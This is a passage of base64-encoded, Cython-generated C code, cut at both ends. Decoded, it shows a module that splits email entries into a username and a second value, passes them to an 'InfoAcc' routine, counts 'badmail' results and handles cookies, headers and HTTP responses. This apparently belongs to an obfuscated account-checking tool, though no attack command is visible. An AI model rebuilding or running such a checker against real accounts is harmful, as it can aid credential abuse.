19weXhfdF8xNCA9IDA7XG5cbiAgICAgICAgICBcbiAgICAgICAgICBfX3B5eF90XzE0ID0gTlVMTDtcbiAgICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0luZm9BY2MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHtcbiAgICAgICAgICAgIF9fcHl4X3RfMTQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIH1cbiAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICB7XG4gICAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF8xNCwgX19weXhfdl91c2VybmFtZSwgX19weXhfdl9nZ307XG4gICAgICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF81LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEzLCAoMy1fX3B5eF90XzEzKSB8IChfX3B5eF90XzEzKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE0KTsgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMjcsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICAgIH1cbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgZ290byBfX3B5eF9MMjE7XG4gICAgICAgIH1cblxuICAgICAgICBcbiAgICAgICAgIHtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF92X2VtYWlsO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgICAgIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEwfTtcbiAgICAgICAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzI5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgaWYgKChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KF9fcHl4X3RfMTApKSkgfHwgKFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfMTApKSkge1xuICAgICAgICAgICAgUHlPYmplY3QqIHNlcXVlbmNlID0gX19weXhfdF8xMDtcbiAgICAgICAgICAgIFB5X3NzaXplX3Qgc2l6ZSA9IF9fUHl4X1B5U2VxdWVuY2VfU0laRShzZXF1ZW5jZSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSAhPSAyKSkge1xuICAgICAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpO1xuICAgICAgICAgICAgICBlbHNlIGlmIChzaXplID49IDApIF9fUHl4X1JhaXNlTmVlZE1vcmVWYWx1ZXNFcnJvcihzaXplKTtcbiAgICAgICAgICAgICAgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICB9XG4gICAgICAgICAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlNcbiAgICAgICAgICAgIGlmIChsaWtlbHkoUHlUdXBsZV9DaGVja0V4YWN0KHNlcXVlbmNlKSkpIHtcbiAgICAgICAgICAgICAgX19weXhfdF81ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBfX3B5eF90XzE0ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMSk7XG4gICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAwKTtcbiAgICAgICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzI5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlMaXN0X0dldEl0ZW1SZWYoc2VxdWVuY2UsIDEpO1xuICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzI5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgICNlbHNlXG4gICAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oc2VxdWVuY2UsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgICBfX3B5eF90XzE0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG4gICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5X3NzaXplX3QgaW5kZXggPSAtMTtcbiAgICAgICAgICAgIF9fcHl4X3RfNiA9IFB5T2JqZWN0X0dldEl0ZXIoX19weXhfdF8xMCk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDMyOSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgICBfX3B5eF90XzE3ID0gKENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpID8gUHlJdGVyX05leHQgOiBfX1B5eF9QeU9iamVjdF9HZXRJdGVyTmV4dEZ1bmMoX19weXhfdF82KTtcbiAgICAgICAgICAgIGluZGV4ID0gMDsgX19weXhfdF81ID0gX19weXhfdF8xNyhfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIGdvdG8gX19weXhfTDI0X3VucGFja2luZ19mYWlsZWQ7XG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICAgIGluZGV4ID0gMTsgX19weXhfdF8xNCA9IF9fcHl4X3RfMTcoX19weXhfdF82KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgZ290byBfX3B5eF9MMjRfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgIGlmIChfX1B5eF9JdGVybmV4dFVucGFja0VuZENoZWNrKF9fcHl4X3RfMTcoX19weXhfdF82KSwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19weXhfdF8xNyA9IE5VTEw7XG4gICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICAgIGdvdG8gX19weXhfTDI1X3VucGFja2luZ19kb25lO1xuICAgICAgICAgICAgX19weXhfTDI0X3VucGFja2luZ19mYWlsZWQ6O1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICAgICAgICBfX3B5eF90XzE3ID0gTlVMTDtcbiAgICAgICAgICAgIGlmIChfX1B5eF9JdGVyRmluaXNoKCkgPT0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKGluZGV4KTtcbiAgICAgICAgICAgIF9fUFlYX0VSUigwLCAzMjksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICAgICAgX19weXhfTDI1X3VucGFja2luZ19kb25lOjtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19weXhfdl91c2VybmFtZSA9IF9fcHl4X3RfNTtcbiAgICAgICAgICBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fcHl4X3ZfZ2cgPSBfX3B5eF90XzE0O1xuICAgICAgICAgIF9fcHl4X3RfMTQgPSAwO1xuXG4gICAgICAgICAgXG4gICAgICAgICAgX19weXhfdF8xNCA9IE5VTEw7XG4gICAgICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9JbmZvQWNjKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzMwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTtcbiAgICAgICAgICBfX3B5eF90XzEzID0gMTtcbiAgICAgICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfNSkpKSB7XG4gICAgICAgICAgICBfX3B5eF90XzE0ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF81KTtcbiAgICAgICAgICAgIGFzc2VydChfX3B5eF90XzE0KTtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF81KTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzUsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgICAgICB9XG4gICAgICAgICAgI2VuZGlmXG4gICAgICAgICAge1xuICAgICAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzNdID0ge19fcHl4X3RfMTQsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3ZfZ2d9O1xuICAgICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDMtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzMwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICB9XG4gICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgfVxuICAgICAgICBfX3B5eF9MMjE6O1xuXG4gICAgICAgIFxuICAgICAgICBnb3RvIF9fcHl4X0wyMDtcbiAgICAgIH1cblxuICAgICAgXG4gICAgICAge1xuICAgICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9iYWRlbWFpbCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5TG9uZ19BZGRPYmpDKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xLCAxLCAxLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzMyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFkZW1haWwsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcblxuICAgICAgICBcbiAgICAgICAgX19weXhfdF8xMCA9IE5VTEw7XG4gICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwcHApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzMzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICBfX3B5eF90XzEzID0gMTtcbiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xNCkpKSB7XG4gICAgICAgICAgX19weXhfdF8xMCA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIGFzc2VydChfX3B5eF90XzEwKTtcbiAgICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTQpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTtcbiAgICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgICAgX19weXhfdF8xMyA9IDA7XG4gICAgICAgIH1cbiAgICAgICAgI2VuZGlmXG4gICAgICAgIHtcbiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMCwgTlVMTH07XG4gICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoX19weXhfdF8xMypfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xNCk7IF9fcHl4X3RfMTQgPSAwO1xuICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMzMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICB9XG4gICAgICBfX3B5eF9MMjA6O1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgZ290byBfX3B5eF9MOF90cnlfZW5kO1xuICAgIF9fcHl4X0wzX2Vycm9yOjtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTIpOyBfX3B5eF90XzEyID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTUpOyBfX3B5eF90XzE1ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTYpOyBfX3B5eF90XzE2ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuXG4gICAgXG4gICAgIHtcbiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApO1xuICAgICAgZ290byBfX3B5eF9MNF9leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG4gICAgX19weXhfTDRfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpO1xuICAgIF9fcHl4X0w4X3RyeV9lbmQ6O1xuICB9XG5cbiAgXG5cbiAgXG4gIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9vKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3RsKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hvc3QpO1xuICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfY29va2llcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9oZWFkZXJzKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3BhcmFtcyk7XG4gIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3Jlc3BvbnNlKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X29rKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X3VzZXJuYW1lKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2dnKTtcbiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2VtYWlsKTtcbiAgX19QeXhfWEdJVkVSRUYoX19weXhfcik7XG4gIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpO1xuICByZXR1cm4gX19weXhfcjtcbn1cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yb3BfMTNmb3JtYXRfbnVtYmVyKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pOyBcbnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJvcF8xM2Zvcm1hdF9udW1iZXIgPSB7ImZvcm1hdF9udW1iZXIiLCAoUHlDRnVuY3Rpb24pKHZvaWQoKikodm9pZCkpKF9fUHl4X1B5Q0Z1bmN0aW9uX0Zhc3RDYWxsV2l0aEtleXdvcmRzKV9fcHl4X3B3XzJvcF8xM2Zvcm1hdF9udW1iZXIsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgMH07XG5zdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJvcF8xM2Zvcm1hdF9udW1iZXIoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbikge1xuICBQeU9iamVjdCAqX19weXhfdl92YWx1ZSA9IDA7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgQ1lUSE9OX1VOVVNFRCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzO1xuICAjZW5kaWZcbiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzO1xuICBQeU9iamVjdCogdmFsdWVzWzFdID0gezB9O1xuICBpbnQgX19weXhfbGluZW5vID0gMDtcbiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMO1xuICBpbnQgX19weXhfY2xpbmVubyA9IDA7XG4gIFB5T2JqZWN0ICpfX3B5eF9yID0gMDtcbiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnNcbiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoImZvcm1hdF9udW1iZXIgKHdyYXBwZXIpIiwgMCk7XG4gICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTtcbiAgI2Vsc2VcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX1NpemUoX19weXhfYXJncyk7IGlmICh1bmxpa2VseShfX3B5eF9uYXJncyA8IDApKSByZXR1cm4gTlVMTDtcbiAgI2VuZGlmXG4gICNlbmRpZlxuICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTtcbiAge1xuICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3ZhbHVlLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMzM4LCBfX3B5eF9MM19lcnJvcilcbiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7XG4gICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7XG4gICAgICAgIGNhc2UgIDE6XG4gICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTtcbiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzM4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7XG4gICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAiZm9ybWF0X251bWJlciIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMzM4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAxOyBpKyspIHtcbiAgICAgICAgaWYgKHVubGlrZWx5KCF2YWx1ZXNbaV0pKSB7IF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJmb3JtYXRfbnVtYmVyIiwgMSwgMSwgMSwgaSk7IF9fUFlYX0VSUigwLCAzMzgsIF9fcHl4X0wzX2Vycm9yKSB9XG4gICAgICB9XG4gICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAxKSkge1xuICAgICAgZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICB9IGVsc2Uge1xuICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMzM4LCBfX3B5eF9MM19lcnJvcilcbiAgICB9XG4gICAgX19weXhfdl92YWx1ZSA9I